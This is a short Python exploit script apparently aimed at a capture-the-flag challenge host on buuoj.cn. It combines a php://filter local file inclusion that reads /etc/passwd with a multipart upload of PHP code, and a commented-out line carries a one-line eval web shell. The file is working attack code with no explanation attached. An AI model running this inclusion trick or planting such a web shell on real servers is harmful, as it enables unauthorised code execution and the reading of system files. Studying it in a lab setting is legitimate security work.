import requests

url = "http://f285812d-1af4-4f53-8a1c-6428a8759de4.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"

# php_content = "<?php @eval($_POST[1]);?>"
php_content = "<?php phpinfo();?>"

file = {
    "file": php_content
}

resp = requests.post(url, files=file)

print(resp.text)